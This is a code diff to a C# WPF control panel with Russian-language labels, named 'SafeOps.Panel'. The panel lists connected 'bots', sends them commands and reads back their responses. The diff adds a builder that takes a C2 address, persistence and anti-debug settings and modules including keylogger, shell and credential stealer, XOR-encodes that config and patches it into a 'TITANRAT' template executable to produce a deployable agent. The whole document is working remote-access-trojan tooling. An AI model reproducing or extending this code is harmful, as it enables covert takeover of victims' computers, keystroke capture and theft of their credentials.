@@ -6,6 +6,7 @@ using System.Linq;
 using System.Net.Http;
 using System.Net.Http.Json;
 using System.Runtime.CompilerServices;
+using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
 using System.Threading;
@@ -31,35 +32,29 @@ namespace SafeOps.Panel
         [JsonPropertyName("queueSize")]
         public int QueueSize { get; set; }
 
-        public string LastSeenLocal => LastSeen == default
-            ? "never"
-            : LastSeen.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");
+        public string LastSeenLocal => LastSeen == default ? "never" : LastSeen.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");
 
         public string Status
         {
             get
             {
                 if (LastSeen == default) return "offline";
-                return DateTime.UtcNow - LastSeen.ToUniversalTime() <= TimeSpan.FromSeconds(30)
-                    ? "online"
-                    : "offline";
+                return DateTime.UtcNow - LastSeen.ToUniversalTime() <= TimeSpan.FromSeconds(30) ? "online" : "offline";
             }
         }
 
         public event PropertyChangedEventHandler? PropertyChanged;
+        public void OnPropertyChanged(string name) => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(name));
     }
 
     public sealed class ResponseEntry
     {
         [JsonPropertyName("time")]
         public string Time { get; set; } = string.Empty;
-
         [JsonPropertyName("hostname")]
         public string Hostname { get; set; } = string.Empty;
-
         [JsonPropertyName("message")]
         public string Message { get; set; } = string.Empty;
-
         public string TimeLocal => Time;
     }
 
@@ -94,46 +89,23 @@ namespace SafeOps.Panel
         {
             InitializeComponent();
             DataContext = this;
-
             _settingsPath = Path.Combine(AppContext.BaseDirectory, "panel_settings.json");
             ClientsGrid.ItemsSource = _clients;
             LogsGrid.ItemsSource = _responses;
         }
 
-        public string StatusText
-        {
-            get => _statusText;
-            private set => SetField(ref _statusText, value);
-        }
-
-        public string FooterText
-        {
-            get => _footerText;
-            private set => SetField(ref _footerText, value);
-        }
-
-        public string LastRefreshText
-        {
-            get => _lastRefreshText;
-            private set => SetField(ref _lastRefreshText, value);
-        }
-
-        public Brush ConnectionBrush
-        {
-            get => _connectionBrush;
-            private set => SetField(ref _connectionBrush, value);
-        }
-
+        public string StatusText { get => _statusText; private set => SetField(ref _statusText, value); }
+        public string FooterText { get => _footerText; private set => SetField(ref _footerText, value); }
+        public string LastRefreshText { get => _lastRefreshText; private set => SetField(ref _lastRefreshText, value); }
+        public Brush ConnectionBrush { get => _connectionBrush; private set => SetField(ref _connectionBrush, value); }
         public event PropertyChangedEventHandler? PropertyChanged;
 
         private async void Window_Loaded(object sender, RoutedEventArgs e)
         {
             await LoadSettingsAsync();
             ApplySettingsToControls();
-
             if (!TryRecreateHttpClient())
                 return;
-
             ScheduleRefresh();
             await RefreshDataAsync();
         }
@@ -144,7 +116,6 @@ namespace SafeOps.Panel
             {
                 if (!File.Exists(_settingsPath))
                     return;
-
                 await using var stream = File.OpenRead(_settingsPath);
                 _settings = await JsonSerializer.DeserializeAsync<PanelSettings>(stream, JsonOptions) ?? new PanelSettings();
                 _settings.ServerAddress = NormalizeServerAddress(_settings.ServerAddress);
@@ -168,7 +139,6 @@ namespace SafeOps.Panel
         {
             if (!int.TryParse(RefreshIntervalTextBox?.Text?.Trim(), out var interval))
                 interval = 2;
-
             return new PanelSettings
             {
                 ServerAddress = NormalizeServerAddress(ServerAddressTextBox?.Text ?? _settings.ServerAddress),
@@ -177,13 +147,7 @@ namespace SafeOps.Panel
             };
         }
 
-        private static string NormalizeServerAddress(string? address)
-        {
-            address = string.IsNullOrWhiteSpace(address)
-                ? "http://localhost:12346"
-                : address.Trim();
-            return address.TrimEnd('/');
-        }
+        private static string NormalizeServerAddress(string? address) => (string.IsNullOrWhiteSpace(address) ? "http://localhost:12346" : address.Trim()).TrimEnd('/');
 
         private void ApplySettingsToControls()
         {
@@ -204,7 +168,6 @@ namespace SafeOps.Panel
                 AddLocalLog("settings", FooterText);
                 return false;
             }
-
             _httpClient.Dispose();
             _httpClient = new HttpClient { BaseAddress = uri, Timeout = TimeSpan.FromSeconds(8) };
             return true;
@@ -213,11 +176,12 @@ namespace SafeOps.Panel
         private void ScheduleRefresh()
         {
             if (_refreshTimer != null)
+            {
                 _refreshTimer.Dispose();
-
+                _refreshTimer = null;
+            }
             if (!_settings.AutoRefresh)
                 return;
-
             _refreshTimer = new Timer(async _ => await RefreshDataAsync(), null,
                 TimeSpan.FromSeconds(_settings.RefreshIntervalSeconds),
                 TimeSpan.FromSeconds(_settings.RefreshIntervalSeconds));
@@ -227,14 +191,12 @@ namespace SafeOps.Panel
         {
             if (_isRefreshing) return;
             _isRefreshing = true;
-
             await Dispatcher.InvokeAsync(() =>
             {
                 StatusText = "Обновление";
                 FooterText = "Запрашиваю список узлов...";
                 ConnectionBrush = Brushes.Goldenrod;
             });
-
             try
             {
                 await RefreshClientsAsync();
@@ -252,9 +214,7 @@ namespace SafeOps.Panel
                 await Dispatcher.InvokeAsync(() =>
                 {
                     StatusText = "Нет связи";
-                    FooterText = ex is TaskCanceledException
-                        ? "Сервер не ответил за отведенное время."
-                        : $"Ошибка подключения: {ex.Message}";
+                    FooterText = ex is TaskCanceledException ? "Сервер не ответил за отведенное время." : $"Ошибка подключения: {ex.Message}";
                     ConnectionBrush = Brushes.OrangeRed;
                     AddLocalLog("network", FooterText);
                 });
@@ -268,21 +228,15 @@ namespace SafeOps.Panel
         private async Task RefreshClientsAsync()
         {
             string? selectedId = null;
-            await Dispatcher.InvokeAsync(() =>
-            {
-                selectedId = (ClientsGrid.SelectedItem as BotInfo)?.Id;
-            });
-
+            await Dispatcher.InvokeAsync(() => selectedId = (ClientsGrid.SelectedItem as BotInfo)?.Id);
             using var response = await _httpClient.GetAsync("/clients");
             response.EnsureSuccessStatusCode();
-
             var clients = await response.Content.ReadFromJsonAsync<BotInfo[]>(JsonOptions) ?? Array.Empty<BotInfo>();
             await Dispatcher.InvokeAsync(() =>
             {
                 _clients.Clear();
                 foreach (var client in clients.OrderBy(c => c.Hostname))
                     _clients.Add(client);
-
                 if (!string.IsNullOrEmpty(selectedId))
                 {
                     var restored = _clients.FirstOrDefault(c => c.Id == selectedId);
@@ -296,22 +250,18 @@ namespace SafeOps.Panel
         {
             using var response = await _httpClient.GetAsync("/responses");
             if (!response.IsSuccessStatusCode) return;
-
             var entries = await response.Content.ReadFromJsonAsync<ResponseEntry[]>(JsonOptions) ?? Array.Empty<ResponseEntry>();
             await Dispatcher.InvokeAsync(() =>
             {
                 _responses.Clear();
                 foreach (var entry in entries.Reverse())
-                {
                     _responses.Add(entry);
-                }
             });
         }
 
         private async Task SendCommandAsync(string command, BotInfo target)
         {
             if (target == null) return;
-
             var payload = new { bot_id = target.Id, command };
             var content = JsonContent.Create(payload, options: JsonOptions);
             try
@@ -360,8 +310,84 @@ namespace SafeOps.Panel
             }
         }
 
-        private async void RefreshButton_Click(object sender, RoutedEventArgs e) => await RefreshDataAsync();
+        private async void BuilderGenerateButton_Click(object sender, RoutedEventArgs e)
+        {
+            string ip = BuilderIpTextBox.Text.Trim();
+            if (!int.TryParse(BuilderPortTextBox.Text.Trim(), out int port)) port = 12345;
+            string persistenceMethod = (BuilderPersistenceComboBox.SelectedItem as ComboBoxItem)?.Content.ToString() ?? "None";
+            int antiDebugLevel = BuilderAntiDebugComboBox.SelectedIndex + 1;
+            if (!int.TryParse(BuilderAutoDeleteTextBox.Text.Trim(), out int autoDeleteDays)) autoDeleteDays = 60;
 
+            var modules = new System.Collections.Generic.List<string>();
+            if (BuilderModuleScreenshot.IsChecked == true) modules.Add("screenshot");
+            if (BuilderModuleKeylogger.IsChecked == true) modules.Add("keylogger");
+            if (BuilderModuleShell.IsChecked == true) modules.Add("shell");
+            if (BuilderModuleFilemgr.IsChecked == true) modules.Add("filemgr");
+            if (BuilderModuleStealer.IsChecked == true) modules.Add("stealer");
+
+            var configObj = new
+            {
+                c2_ip = ip,
+                c2_port = port,
+                heartbeat_interval = 30,
+                auto_delete_days = autoDeleteDays,
+                persistence_method = persistenceMethod,
+                anti_debug_level = antiDebugLevel,
+                modules = modules
+            };
+            string json = JsonSerializer.Serialize(configObj, JsonOptions);
+            byte[] jsonBytes = Encoding.UTF8.GetBytes(json);
+            for (int i = 0; i < jsonBytes.Length; i++) jsonBytes[i] ^= 0xAA;
+
+            string templatePath = Path.Combine(AppContext.BaseDirectory, "template", "core_template.exe");
+            if (!File.Exists(templatePath))
+            {
+                BuilderResultTextBlock.Text = "Шаблон core_template.exe не найден. Поместите его в Panel/template/";
+                return;
+            }
+            byte[] templateBytes = File.ReadAllBytes(templatePath);
+            string startMarker = "TITANRAT_CFG_START";
+            string endMarker = "TITANRAT_CFG_END";
+            byte[] startBytes = Encoding.ASCII.GetBytes(startMarker);
+            byte[] endBytes = Encoding.ASCII.GetBytes(endMarker);
+            int startPos = -1, endPos = -1;
+            for (int i = 0; i <= templateBytes.Length - startBytes.Length; i++)
+            {
+                if (templateBytes.Skip(i).Take(startBytes.Length).SequenceEqual(startBytes))
+                {
+                    startPos = i + startBytes.Length;
+                    break;
+                }
+            }
+            if (startPos == -1)
+            {
+                BuilderResultTextBlock.Text = "Не удалось найти маркер конфигурации в шаблоне.";
+                return;
+            }
+            for (int i = startPos; i <= templateBytes.Length - endBytes.Length; i++)
+            {
+                if (templateBytes.Skip(i).Take(endBytes.Length).SequenceEqual(endBytes))
+                {
+                    endPos = i;
+                    break;
+                }
+            }
+            if (endPos == -1 || endPos - startPos < jsonBytes.Length)
+            {
+                BuilderResultTextBlock.Text = "Недостаточно места для конфигурации в шаблоне.";
+                return;
+            }
+            Array.Copy(jsonBytes, 0, templateBytes, startPos, jsonBytes.Length);
+            for (int i = startPos + jsonBytes.Length; i < endPos; i++) templateBytes[i] = 0;
+
+            string outputDir = Path.Combine(AppContext.BaseDirectory, "BuilderOutput");
+            Directory.CreateDirectory(outputDir);
+            string outputFile = Path.Combine(outputDir, $"core_{DateTime.Now:yyyyMMdd_HHmmss}.exe");
+            File.WriteAllBytes(outputFile, templateBytes);
+            BuilderResultTextBlock.Text = $"Агент собран: {outputFile}";
+        }
+
+        private async void RefreshButton_Click(object sender, RoutedEventArgs e) => await RefreshDataAsync();
         private async void ContextMenuPing_Click(object sender, RoutedEventArgs e)
         {
             if (ClientsGrid.SelectedItem is BotInfo selected)
@@ -369,7 +395,6 @@ namespace SafeOps.Panel
             else
                 MessageBox.Show("Выберите клиента.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
         }
-
         private async void ContextMenuScreenshot_Click(object sender, RoutedEventArgs e)
         {
             if (ClientsGrid.SelectedItem is BotInfo selected)
@@ -377,7 +402,6 @@ namespace SafeOps.Panel
             else
                 MessageBox.Show("Выберите клиента.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
         }
-
         private async void ContextMenuInfo_Click(object sender, RoutedEventArgs e)
         {
             if (ClientsGrid.SelectedItem is BotInfo selected)
@@ -385,11 +409,9 @@ namespace SafeOps.Panel
             else
                 MessageBox.Show("Выберите клиента.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
         }
-
         private void DataGridRow_MouseRightButtonDown(object sender, MouseButtonEventArgs e)
         {
-            var row = sender as DataGridRow;
-            if (row != null)
+            if (sender is DataGridRow row)
             {
                 ClientsGrid.SelectedItem = row.Item;
                 if (row.ContextMenu != null)
@@ -397,12 +419,7 @@ namespace SafeOps.Panel
                 e.Handled = true;
             }
         }
-
-        private async void ClearLogsButton_Click(object sender, RoutedEventArgs e)
-        {
-            await ClearLogsOnServerAsync();
-        }
-
+        private async void ClearLogsButton_Click(object sender, RoutedEventArgs e) => await ClearLogsOnServerAsync();
         private async void SaveSettingsButton_Click(object sender, RoutedEventArgs e)
         {
             try
@@ -419,18 +436,14 @@ namespace SafeOps.Panel
                 MessageBox.Show($"Не удалось сохранить настройки: {ex.Message}", "SafeOps", MessageBoxButton.OK, MessageBoxImage.Error);
             }
         }
-
         private async void TestConnectionButton_Click(object sender, RoutedEventArgs e)
         {
             _settings = ReadSettingsFromControls();
             if (!TryRecreateHttpClient()) return;
-
             try
             {
                 using var response = await _httpClient.GetAsync("/clients");
-                FooterText = response.IsSuccessStatusCode
-                    ? "Связь проверена: API отвечает."
-                    : $"API ответил статусом {(int)response.StatusCode}.";
+                FooterText = response.IsSuccessStatusCode ? "Связь проверена: API отвечает." : $"API ответил статусом {(int)response.StatusCode}.";
                 StatusText = response.IsSuccessStatusCode ? "Онлайн" : "Ошибка";
                 ConnectionBrush = response.IsSuccessStatusCode ? Brushes.LimeGreen : Brushes.OrangeRed;
                 AddLocalLog("network", FooterText);
@@ -443,32 +456,10 @@ namespace SafeOps.Panel
                 AddLocalLog("network", FooterText);
             }
         }
-
-        private void AutoRefreshCheckBox_Changed(object sender, RoutedEventArgs e)
-        {
-            _settings = ReadSettingsFromControls();
-            ScheduleRefresh();
-        }
-
-        private void DecreaseIntervalButton_Click(object sender, RoutedEventArgs e)
-        {
-            if (int.TryParse(RefreshIntervalTextBox.Text.Trim(), out int current))
-                RefreshIntervalTextBox.Text = Math.Max(1, current - 1).ToString();
-        }
-
-        private void IncreaseIntervalButton_Click(object sender, RoutedEventArgs e)
-        {
-            if (int.TryParse(RefreshIntervalTextBox.Text.Trim(), out int current))
-                RefreshIntervalTextBox.Text = (current + 1).ToString();
-        }
-
-        protected override void OnClosing(CancelEventArgs e)
-        {
-            _refreshTimer?.Dispose();
-            _httpClient.Dispose();
-            base.OnClosing(e);
-        }
-
+        private void AutoRefreshCheckBox_Changed(object sender, RoutedEventArgs e) { _settings = ReadSettingsFromControls(); ScheduleRefresh(); }
+        private void DecreaseIntervalButton_Click(object sender, RoutedEventArgs e) { if (int.TryParse(RefreshIntervalTextBox.Text.Trim(), out int current)) RefreshIntervalTextBox.Text = Math.Max(1, current - 1).ToString(); }
+        private void IncreaseIntervalButton_Click(object sender, RoutedEventArgs e) { if (int.TryParse(RefreshIntervalTextBox.Text.Trim(), out int current)) RefreshIntervalTextBox.Text = (current + 1).ToString(); }
+        protected override void OnClosing(CancelEventArgs e) { _refreshTimer?.Dispose(); _httpClient.Dispose(); base.OnClosing(e); }
         private bool SetField<T>(ref T field, T value, [CallerMemberName] string? propertyName = null)
         {
             if (Equals(field, value)) return false;
